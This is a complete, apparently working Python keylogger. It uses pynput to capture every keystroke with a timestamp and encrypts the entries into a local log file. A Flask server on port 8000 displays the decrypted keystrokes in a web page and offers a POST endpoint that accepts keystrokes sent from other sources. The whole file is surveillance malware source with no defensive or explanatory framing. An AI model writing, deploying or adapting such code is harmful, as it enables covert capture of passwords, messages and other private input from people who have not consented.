from pynput import keyboard
from cryptography.fernet import Fernet
from flask import Flask, render_template_string, request, jsonify
import datetime
import os
import threading

BUFFER_SIZE = 10
KEY_FILE_NAME = "secret.key"
LOG_FILE_NAME = "encrypted_log.txt"

if not os.path.exists(KEY_FILE_NAME):
    key = Fernet.generate_key()
    with open(KEY_FILE_NAME, "wb") as key_file:
        key_file.write(key)
else:
    with open(KEY_FILE_NAME, "rb") as key_file:
        key = key_file.read()

fernet = Fernet(key)
buffer = []

def on_press(key):
    global buffer
    try:
        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if hasattr(key, 'char') and key.char:
            text = f"{time_str} - {key.char}"
        else:
            text = f"{time_str} - [{key.name}]"
        encrypted = fernet.encrypt(text.encode())
        buffer.append(encrypted)
        if len(buffer) >= BUFFER_SIZE:
            with open(LOG_FILE_NAME, "ab") as f:
                f.write(b"\n".join(buffer) + b"\n")
            buffer.clear()
    except:
        pass

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

app = Flask(__name__)

@app.route("/")
def index():
    if not os.path.exists(LOG_FILE_NAME):
        return "No logs yet."
    logs = []
    with open(LOG_FILE_NAME, "rb") as f:
        for line in f:
            try:
                decrypted = fernet.decrypt(line.strip()).decode()
                logs.append(decrypted)
            except:
                pass
    html = """
    <h1>Encrypted Keylogger Logs</h1>
    <ul>
    {% for log in logs %}
        <li>{{ log }}</li>
    {% endfor %}
    </ul>
    """
    return render_template_string(html, logs=logs)

@app.route("/api/keystrokes", methods=["POST"])
def log_keystroke_api():
    keystroke_data = request.json
    key_char = keystroke_data.get('key_char')
    timestamp = keystroke_data.get('timestamp')
    if key_char and timestamp:
        text = f"{timestamp} - {key_char}"
        encrypted = fernet.encrypt(text.encode())
        with open(LOG_FILE_NAME, "ab") as f:
            f.write(encrypted + b"\n")
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error", "message": "Invalid data"}), 400

if __name__ == "__main__":
    t = threading.Thread(target=start_keylogger)
    t.daemon = True
    t.start()
    app.run(port=8000)
